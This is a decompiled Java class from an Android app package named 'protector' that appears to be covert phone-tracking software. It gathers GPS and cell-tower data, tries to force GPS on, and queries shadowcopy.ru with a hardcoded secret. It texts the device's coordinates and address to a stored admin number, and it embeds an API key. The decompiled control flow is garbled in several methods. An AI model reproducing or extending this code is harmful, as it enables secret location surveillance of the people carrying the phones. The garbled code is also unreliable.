package ru.mobile.protector;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.res.Resources;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Looper;
import android.os.PowerManager;
import android.telephony.CellLocation;
import android.telephony.PhoneStateListener;
import android.telephony.gsm.GsmCellLocation;
import android.text.format.Time;
import com.android.location.CustomExceptionHandler;
import com.android.location.PlayService;
import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;

public class WifiAndCellCollector
  extends PhoneStateListener
  implements Runnable, LocationListener
{
  public static final String API_KEY = "APQvX08BAAAAVZADAAIAyFb5BG0VRhZ-K2ENvCMfG3JvJnwAAAAAAAAAAAC4myAd_mDRCn_1IGovluouFU1IFQ==";
  public static final String CDMA = "cdma";
  public static final String GSM = "gsm";
  public static final String LBS_API_HOST = "http://api.lbs.yandex.net/geolocation";
  public static final String PROTOCOL_VERSION = "1.0";
  public static final String WIFIPOOL_HOST = "http://api.lbs.yandex.net/partners/wifipool?";
  protected static final boolean[] WWW_FORM_URL;
  private static final Object[] emptyParam;
  private static final Class[] emptyParamDesc;
  private static volatile boolean isRun;
  private static final String[] lbsContentType;
  private static final String[] lbsPostName = { "xml" };
  public static String provider;
  private static final String[] wifipoolContentType;
  private static final String[] wifipoolContentTypeGzipped;
  private static final String[] wifipoolPostName;
  private int MCC = 0;
  private int MNC = 0;
  private boolean bRetSMS = false;
  private int cellId;
  private List<CellInfo> cellInfos;
  private Context context;
  private SimpleDateFormat formatter;
  long iLastSatWakeUp = 0L;
  private volatile boolean isGPSActive = false;
  private long lLastRunTime = 0L;
  private int lac;
  private volatile Location lastGpsFix = null;
  private volatile long lastGpsFixTime;
  private long lastSendDataTime;
  private LbsInfo lastWifi = null;
  private long lastWifiScanTime;
  private LbsLocationListener listener;
  private String manufacturer;
  private String mcc;
  private String mnc;
  private String model;
  private String networkType;
  private String radioType;
  private int signalStrength;
  private String uuid;
  private WifiManager wifi;
  private List<WifiInfo> wifiInfos;
  private ArrayList<String> wifipoolChunks;
  
  static
  {
    lbsContentType = new String[] { "xml" };
    wifipoolPostName = new String[] { "data" };
    wifipoolContentType = new String[] { "xml" };
    wifipoolContentTypeGzipped = new String[] { "xml/gzip" };
    provider = "";
    isRun = false;
    emptyParamDesc = new Class[0];
    emptyParam = new Object[0];
    WWW_FORM_URL = new boolean['Ä€'];
    int i = 97;
    if (i > 122)
    {
      i = 65;
      label103:
      if (i <= 90) {
        break label167;
      }
      i = 48;
    }
    for (;;)
    {
      if (i > 57)
      {
        WWW_FORM_URL[45] = true;
        WWW_FORM_URL[95] = true;
        WWW_FORM_URL[46] = true;
        WWW_FORM_URL[42] = true;
        WWW_FORM_URL[32] = true;
        return;
        WWW_FORM_URL[i] = true;
        i += 1;
        break;
        label167:
        WWW_FORM_URL[i] = true;
        i += 1;
        break label103;
      }
      WWW_FORM_URL[i] = true;
      i += 1;
    }
  }
  
  public WifiAndCellCollector(Context paramContext, LbsLocationListener paramLbsLocationListener, String paramString)
  {
    this.listener = paramLbsLocationListener;
    this.context = paramContext;
    this.uuid = paramString;
    this.wifi = ((WifiManager)paramContext.getSystemService("wifi"));
    this.lastWifiScanTime = 0L;
    this.lastSendDataTime = System.currentTimeMillis();
  }
  
  public static void EXCEPT(Exception paramException, String paramString)
  {
    PlayService.EXCEPT(paramException, paramString);
  }
  
  public static void FLOG(String paramString)
  {
    PlayService.FLOG(paramString);
  }
  
  public static void GLOG(String paramString)
  {
    PlayService.FLOG(paramString);
  }
  
  private void InsertUniDB(CCidLacTime paramCCidLacTime)
  {
    FLOG("InsertUniDB");
    if (paramCCidLacTime == null) {
      return;
    }
    GLOG("curcidlac=" + paramCCidLacTime.cid + "," + paramCCidLacTime.lac + "," + paramCCidLacTime.mnc + "," + paramCCidLacTime.mcc);
    this.MNC = paramCCidLacTime.mnc;
    this.MCC = paramCCidLacTime.mcc;
    ContentValues localContentValues = new ContentValues();
    localContentValues.put("resource_id", Integer.valueOf(1));
    localContentValues.put("timepoint", Long.valueOf(paramCCidLacTime.timepoint));
    GLOG("put=" + paramCCidLacTime.timepoint);
    localContentValues.put("int1", Integer.valueOf(paramCCidLacTime.cid));
    localContentValues.put("int2", Integer.valueOf(paramCCidLacTime.lac));
    try
    {
      PlayService.ref.getContentResolver().insert(UniProvider.CONTENT_URI, localContentValues);
      this.lastGpsFixTime = System.currentTimeMillis();
      return;
    }
    catch (Exception paramCCidLacTime) {}
  }
  
  public static byte[] encodeUrl(byte[] paramArrayOfByte)
  {
    if (paramArrayOfByte == null) {
      return null;
    }
    boolean[] arrayOfBoolean = WWW_FORM_URL;
    ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream();
    int j = 0;
    if (j >= paramArrayOfByte.length) {
      return localByteArrayOutputStream.toByteArray();
    }
    int k = paramArrayOfByte[j];
    int i = k;
    if (k < 0) {
      i = k + 256;
    }
    if (arrayOfBoolean[i] != 0)
    {
      k = i;
      if (i == 32) {
        k = 43;
      }
      localByteArrayOutputStream.write(k);
    }
    for (;;)
    {
      j += 1;
      break;
      localByteArrayOutputStream.write(37);
      k = Character.toUpperCase(forDigit(i >> 4 & 0xF, 16));
      i = Character.toUpperCase(forDigit(i & 0xF, 16));
      localByteArrayOutputStream.write(k);
      localByteArrayOutputStream.write(i);
    }
  }
  
  private static char forDigit(int paramInt1, int paramInt2)
  {
    if ((paramInt1 >= paramInt2) || (paramInt1 < 0)) {}
    while ((paramInt2 < 2) || (paramInt2 > 36)) {
      return '\000';
    }
    if (paramInt1 < 10) {
      return (char)(paramInt1 + 48);
    }
    return (char)(paramInt1 + 87);
  }
  
  private LbsInfo getLatLongByCidLac(CCidLacTime paramCCidLacTime)
  {
    FLOG("getLatLongByCidLac()");
    Object localObject1 = SMSReceiver.PureGet("shadowcopy.ru", "geo_location.php?mcc=" + paramCCidLacTime.mcc + "&mnc=" + paramCCidLacTime.mnc + "&lac=" + paramCCidLacTime.lac + "&cid=" + paramCCidLacTime.cid + "&secret=eg78xzfbcfgyhcfb");
    if (localObject1 != null)
    {
      localObject1 = ((String)localObject1).split("\n\n");
      if (localObject1.length != 2) {
        FLOG("answer err1 = " + localObject1.length);
      }
    }
    else
    {
      return null;
    }
    Object localObject2 = localObject1[1].split("\n");
    localObject1 = "";
    int i = 0;
    if (i >= localObject2.length) {}
    for (;;)
    {
      localObject1 = ((String)localObject1).split(":");
      if (localObject1.length != 2) {
        break label267;
      }
      localObject2 = new LbsInfo();
      ((LbsInfo)localObject2).lbsAltitude = "0";
      ((LbsInfo)localObject2).lbsLatitude = localObject1[0];
      ((LbsInfo)localObject2).lbsLongtitude = localObject1[1];
      ((LbsInfo)localObject2).lbsType = "gsm";
      ((LbsInfo)localObject2).lbsPrecision = "500";
      ((LbsInfo)localObject2).timepoint = paramCCidLacTime.timepoint;
      return localObject2;
      if (localObject2[i].length() == 0)
      {
        i += 1;
        break;
      }
      localObject1 = localObject2[i];
    }
    label267:
    FLOG("Broken answer");
    return null;
  }
  
  private boolean isNetworkAvailable()
  {
    NetworkInfo localNetworkInfo = ((ConnectivityManager)this.context.getSystemService("connectivity")).getActiveNetworkInfo();
    return (localNetworkInfo != null) && (localNetworkInfo.isConnected());
  }
  
  public void StartGPSCollect(boolean paramBoolean)
  {
    GLOG("Starting gps collect();" + this.iLastSatWakeUp);
    if (this.isGPSActive) {
      GLOG("Gps already active, return");
    }
    Object localObject;
    label442:
    label449:
    for (;;)
    {
      return;
      if (!paramBoolean) {
        if (PlayService.iGPSCheckInterval > 0)
        {
          FLOG("curtime=" + PlayService.getCurrentTime());
          long l = this.iLastSatWakeUp + PlayService.iGPSCheckInterval * 60 * 1000;
          FLOG("last wakeup=" + this.iLastSatWakeUp);
          FLOG("more than now? " + l);
          if (PlayService.getCurrentTime() < l) {
            FLOG("Skip real GPS, too early: " + (l - PlayService.getCurrentTime()));
          }
        }
        else
        {
          GLOG("Don't use GEO at all, ret");
          this.iLastSatWakeUp = PlayService.getCurrentTime();
          return;
        }
      }
      localObject = (LocationManager)this.context.getSystemService("location");
      Criteria localCriteria = new Criteria();
      localCriteria.setAccuracy(1);
      provider = ((LocationManager)localObject).getBestProvider(localCriteria, true);
      GLOG("Force ? " + PlayService.iForceGPS);
      if (((provider == null) || (!provider.equals("gps"))) && (PlayService.iForceGPS > 0))
      {
        GLOG("provider is not GPS or NULL");
        if (PlayService.ref != null)
        {
          FLOG("try to ON GPS");
          PlayService.ref.turnGpsOn(PlayService.ref);
        }
      }
      else
      {
        paramBoolean = isNetworkAvailable();
        GLOG("best provider is " + provider + ",n=" + paramBoolean);
        if ((provider != null) && (provider.equals("passive"))) {
          provider = null;
        }
        if (((provider != null) && ((!provider.equals("network")) || (paramBoolean))) || (PlayService.ref == null)) {
          break;
        }
        GLOG("Remember cid/lac for future resolve");
        localObject = PlayService.ref.getCurCidLac();
        if (localObject == null) {
          break label442;
        }
        InsertUniDB((CCidLacTime)localObject);
      }
      for (;;)
      {
        if (!this.bRetSMS) {
          break label449;
        }
        PlayService.ref.SendSMS(PlayService.sAdminNumber, PlayService.res.getString(2130968654));
        this.bRetSMS = false;
        return;
        GLOG("PlayService.ref is null");
        break;
        GLOG("curcidlac=NULL");
      }
    }
    if (provider != null)
    {
      ((LocationManager)localObject).requestLocationUpdates(provider, PlayService.iGPSTimeout * 1000, 1.0F, this);
      this.isGPSActive = true;
      GLOG("Request location updates");
      return;
    }
    GLOG("no Provider available");
  }
  
  public String getBestProvider()
  {
    LocationManager localLocationManager = (LocationManager)this.context.getSystemService("location");
    Criteria localCriteria = new Criteria();
    localCriteria.setAccuracy(1);
    provider = localLocationManager.getBestProvider(localCriteria, true);
    if (provider == null)
    {
      GLOG("fine accuracy NA, try coarse");
      localCriteria.setAccuracy(2);
      provider = localLocationManager.getBestProvider(localCriteria, true);
    }
    return provider;
  }
  
  public boolean isAlive()
  {
    return PlayService.getCurrentTime() - this.lLastRunTime < 5000L;
  }
  
  public void onCellLocationChanged(CellLocation paramCellLocation)
  {
    if ((paramCellLocation != null) && ((paramCellLocation instanceof GsmCellLocation)))
    {
      paramCellLocation = (GsmCellLocation)paramCellLocation;
      this.lac = paramCellLocation.getLac();
      this.cellId = paramCellLocation.getCid();
    }
  }
  
  public void onDataConnectionStateChanged(int paramInt) {}
  
  public void onLocationChanged(Location paramLocation)
  {
    GLOG("GOT GPS/network DATA " + paramLocation.getLatitude() + "," + paramLocation.getLongitude());
    this.lastGpsFixTime = System.currentTimeMillis();
    this.lastGpsFix = paramLocation;
    this.lastGpsFix.setTime(this.lastGpsFixTime);
    if ((provider != null) && (paramLocation != null))
    {
      GLOG("tried provider [" + provider + "], but got " + paramLocation.getProvider());
      if (PlayService.ref != null)
      {
        if (PlayService.ref.curInfo == null) {
          PlayService.ref.curInfo = new LbsInfo();
        }
        PlayService.ref.curInfo.timepoint = this.lastGpsFixTime;
        PlayService.ref.curInfo.lbsAltitude = paramLocation.getAltitude();
        PlayService.ref.curInfo.lbsLatitude = paramLocation.getLatitude();
        PlayService.ref.curInfo.lbsLongtitude = paramLocation.getLongitude();
        PlayService.ref.curInfo.lbsType = paramLocation.getProvider();
        PlayService.ref.curInfo.lbsPrecision = paramLocation.getAccuracy();
        PlayService.ref.addLocationInfo(PlayService.ref.curInfo);
        if (this.bRetSMS)
        {
          Object localObject = new Time();
          ((Time)localObject).set(this.lastGpsFixTime);
          localObject = ((Time)localObject).monthDay + "." + (((Time)localObject).month + 1) + "." + ((Time)localObject).year + " " + ((Time)localObject).hour + ":" + ((Time)localObject).minute;
          localObject = PlayService.res.getString(2130968655) + paramLocation.getLatitude() + "," + PlayService.res.getString(2130968656) + paramLocation.getLongitude() + "," + PlayService.res.getString(2130968657) + paramLocation.getAccuracy() + "m." + "," + PlayService.res.getString(2130968658) + paramLocation.getProvider() + "," + PlayService.res.getString(2130968659) + (String)localObject;
          String str = SMSReceiver.LatLong2Address(paramLocation.getLatitude(), paramLocation.getLongitude());
          FLOG("ll2=" + str);
          paramLocation = (Location)localObject;
          if (str.length() > 0) {
            paramLocation = localObject + " " + str;
          }
          PlayService.ref.SendSMS(PlayService.sAdminNumber, paramLocation);
          this.bRetSMS = false;
        }
      }
    }
    for (;;)
    {
      GLOG("Calling StopGPSCollect() after 1 data");
      stopGPSCollect("Calling StopGPSCollect() after 1 data got");
      this.iLastSatWakeUp = PlayService.getCurrentTime();
      return;
      GLOG("Skip sending data cause this is not GPS data");
    }
  }
  
  public void onProviderDisabled(String paramString) {}
  
  public void onProviderEnabled(String paramString) {}
  
  public void onSignalStrengthChanged(int paramInt)
  {
    this.signalStrength = (paramInt * 2 - 113);
  }
  
  public void onStatusChanged(String paramString, int paramInt, Bundle paramBundle) {}
  
  public LbsInfo returnBestLocation(boolean paramBoolean, int paramInt1, int paramInt2)
  {
    GLOG("Best location requested!");
    LbsInfo localLbsInfo = tryFindLostPositions(paramInt1, paramInt2);
    if (this.lastGpsFix != null)
    {
      localLbsInfo = new LbsInfo();
      localLbsInfo.timepoint = this.lastGpsFixTime;
      localLbsInfo.lbsAltitude = this.lastGpsFix.getAltitude();
      localLbsInfo.lbsLatitude = this.lastGpsFix.getLatitude();
      localLbsInfo.lbsLongtitude = this.lastGpsFix.getLongitude();
      localLbsInfo.lbsType = this.lastGpsFix.getProvider();
      localLbsInfo.lbsPrecision = this.lastGpsFix.getAccuracy();
    }
    GLOG("return " + localLbsInfo);
    return localLbsInfo;
  }
  
  public void run()
  {
    if (!(Thread.getDefaultUncaughtExceptionHandler() instanceof CustomExceptionHandler)) {
      Thread.setDefaultUncaughtExceptionHandler(new CustomExceptionHandler("/sdcard"));
    }
    Time localTime = new Time();
    localTime.setToNow();
    long l1 = 0L;
    this.isGPSActive = false;
    for (;;)
    {
      try
      {
        Looper.prepare();
        GLOG("sleep 10 secs");
        Thread.sleep(10000L);
        GLOG("wake collection!!!");
        bool = isRun;
        if (bool) {
          continue;
        }
      }
      catch (Exception localException)
      {
        boolean bool;
        EXCEPT(localException, "wifiCellCollector DIED");
        continue;
        localException.setToNow();
        if (!this.isGPSActive) {
          break label303;
        }
        if ((l1 <= 0L) || (localException.toMillis(true) - l1 <= PlayService.iGPSTimeout * 1000)) {
          break label390;
        }
        stopGPSCollect("Stopping GPS try by timeout " + PlayService.iGPSTimeout * 1000);
        if (!this.bRetSMS) {
          continue;
        }
        if (PlayService.ref == null) {
          continue;
        }
        PlayService.ref.SendSMS(PlayService.sAdminNumber, PlayService.res.getString(2130968613) + " [" + provider + "]");
        this.bRetSMS = false;
        GLOG("Remember cid/lac for future resolve");
        CCidLacTime localCCidLacTime = PlayService.ref.getCurCidLac();
        if (localCCidLacTime == null) {
          break label303;
        }
        InsertUniDB(localCCidLacTime);
      }
      stopGPSCollect("CONTROL THREAD EXITED");
      GLOG("CONTROL THREAD EXITED");
      return;
      bool = ((PowerManager)this.context.getSystemService("power")).isScreenOn();
      this.lLastRunTime = PlayService.getCurrentTime();
      if (!bool) {
        continue;
      }
      GLOG("GPS:screen is on, wait 60s");
      Thread.sleep(60000L);
    }
    label303:
    long l2 = l1;
    if (!this.isGPSActive)
    {
      if (localException.toMillis(true) - this.lastGpsFixTime <= PlayService.iGPSCheckInterval * 60 * 1000) {
        break label505;
      }
      GLOG("GPS is not active, direct call start GPS");
      if (PlayService.ref == null) {
        break label496;
      }
      PlayService.ref.wifiAndCellCollector.StartGPSCollect(false);
    }
    label360:
    for (l2 = localException.toMillis(true);; l2 = l1)
    {
      this.lLastRunTime = PlayService.getCurrentTime();
      Thread.sleep(PlayService.iGPSTimeout * 1000);
      l1 = l2;
      break;
      label390:
      GLOG("Gps start time " + l1);
      GLOG("Now() " + localException.toMillis(true));
      GLOG("Time until GPS stop " + (-localException.toMillis(true) + l1 + PlayService.iGPSTimeout * 1000) / 1000L);
      if (l1 != 0L) {
        break label303;
      }
      GLOG("Fuck, GPS is not active, but lStartTime == 0");
      this.isGPSActive = false;
      break label303;
      label496:
      GLOG("Playservice.ref is NULL!");
      break label360;
      label505:
      FLOG("Time until GPS start:" + (-localException.toMillis(true) + this.lastGpsFixTime + PlayService.iGPSCheckInterval * 60 * 1000) / 1000L);
    }
  }
  
  public void sendSms()
  {
    this.bRetSMS = true;
    if (!this.isGPSActive)
    {
      this.lastGpsFixTime = 0L;
      this.iLastSatWakeUp = 0L;
    }
  }
  
  public void startCollect()
  {
    GLOG("Starting WIFI collect();");
    if (isRun)
    {
      GLOG("alreadyRunning, return");
      return;
    }
    isRun = true;
    GLOG("WIFICOLLECTOR::Starting control thread");
    new Thread(this).start();
  }
  
  public void stopGPSCollect(String paramString)
  {
    GLOG("stopGPSCollect() : reason:" + paramString);
    ((LocationManager)this.context.getSystemService("location")).removeUpdates(this);
    this.isGPSActive = false;
  }
  
  public LbsInfo tryFindLostPositions(int paramInt1, int paramInt2)
  {
    GLOG("tryFindLostPositions()" + paramInt2 + "," + paramInt1);
    if (!isNetworkAvailable())
    {
      FLOG("No network, skip");
      return null;
    }
    if (paramInt1 * paramInt2 != 0)
    {
      this.MNC = paramInt1;
      this.MCC = paramInt2;
    }
    if (this.MNC * this.MCC == 0)
    {
      FLOG("No MNC * MCC");
      return null;
    }
    FLOG("getUniDBCidlac()");
    Cursor localCursor = PlayService.ref.getContentResolver().query(UniProvider.CONTENT_URI, null, "resource_id=1", null, null);
    if (localCursor == null)
    {
      FLOG("UniDB cursor is NULL, ret");
      return null;
    }
    localObject4 = null;
    localObject5 = null;
    try
    {
      FLOG("FOUND UNIDB=" + localCursor.getCount());
      localObject1 = localObject4;
      if (!localCursor.moveToFirst()) {
        break label520;
      }
      paramInt2 = localCursor.getColumnIndex("_ID");
      i = localCursor.getColumnIndex("int1");
      j = localCursor.getColumnIndex("int2");
      k = localCursor.getColumnIndex("timepoint");
      paramInt1 = 9;
    }
    catch (Exception localException1)
    {
      for (;;)
      {
        Object localObject1;
        int i;
        int j;
        int k;
        localObject2 = localObject4;
        continue;
      }
    }
    localObject4 = localObject5;
    try
    {
      int m = localCursor.getInt(paramInt2);
      localObject4 = localObject5;
      int n = localCursor.getInt(i);
      localObject4 = localObject5;
      int i1 = localCursor.getInt(j);
      localObject4 = localObject5;
      long l = localCursor.getLong(k);
      localObject4 = localObject5;
      GLOG("READtime=" + l);
      localObject4 = localObject5;
      localObject1 = new CCidLacTime(n, i1, l, this.MNC, this.MCC);
      localObject4 = localObject5;
      GLOG("Take " + ((CCidLacTime)localObject1).cid + "," + ((CCidLacTime)localObject1).lac);
      localObject4 = localObject5;
      LbsInfo localLbsInfo = getLatLongByCidLac((CCidLacTime)localObject1);
      localObject4 = localObject5;
      GLOG("Answer=" + localLbsInfo);
      localObject1 = localObject5;
      if (localLbsInfo != null)
      {
        localObject4 = localObject5;
        GLOG(localLbsInfo.lbsLatitude);
        localObject4 = localObject5;
        GLOG(localLbsInfo.lbsLongtitude);
        localObject4 = localObject5;
        PlayService.ref.addLocationInfo(localLbsInfo);
        localObject4 = localObject5;
        this.iLastSatWakeUp = PlayService.getCurrentTime();
        localObject1 = localLbsInfo;
      }
      localObject4 = localObject1;
      PlayService.ref.getContentResolver().delete(UniProvider.CONTENT_URI, "_ID=" + m, null);
      localObject4 = localObject1;
      boolean bool = localCursor.moveToNext();
      if (!bool) {
        break label559;
      }
      if (paramInt1 > 0) {
        break label548;
      }
    }
    catch (Exception localException2)
    {
      label520:
      Object localObject3;
      for (;;)
      {
        Object localObject2;
        localObject3 = localObject4;
      }
      paramInt1 -= 1;
      localObject5 = localObject3;
    }
    localCursor.close();
    return localObject1;
  }
  
  public class CCidLacTime
  {
    public int cid;
    public int lac;
    public int mcc;
    public int mnc;
    public long timepoint;
    
    public CCidLacTime(int paramInt1, int paramInt2, long paramLong, int paramInt3, int paramInt4)
    {
      this.cid = paramInt1;
      this.lac = paramInt2;
      this.timepoint = paramLong;
      this.mnc = paramInt3;
      this.mcc = paramInt4;
    }
  }
  
  private class CellInfo
  {
    private int cellId;
    private String lac;
    private String signalStrength;
    
    private CellInfo() {}
  }
  
  private class WifiInfo
  {
    private String mac;
    private String name;
    private int signalStrength;
    private String ssid;
    
    private WifiInfo() {}
  }
}
